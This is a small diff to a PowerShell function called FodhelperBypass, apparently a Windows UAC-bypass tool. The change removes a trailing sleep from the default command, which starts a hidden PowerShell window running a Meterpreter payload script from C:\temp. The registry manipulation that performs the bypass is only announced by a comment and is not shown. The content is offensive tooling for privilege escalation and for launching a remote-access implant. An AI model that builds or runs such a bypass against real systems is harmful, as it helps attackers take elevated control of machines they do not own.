@@ -15,7 +15,7 @@
 function FodhelperBypass(){ 
  Param (
            
-        [String]$program = "cmd.exe /c start /min powershell.exe -executionpolicy remotesigned -File ""C:\temp\meterpreter-64.ps1""; sleep 360" #default
+        [String]$program = "cmd.exe /c start /min powershell.exe -executionpolicy remotesigned -File ""C:\temp\meterpreter-64.ps1""" #default
        )
 
     #Create registry structure
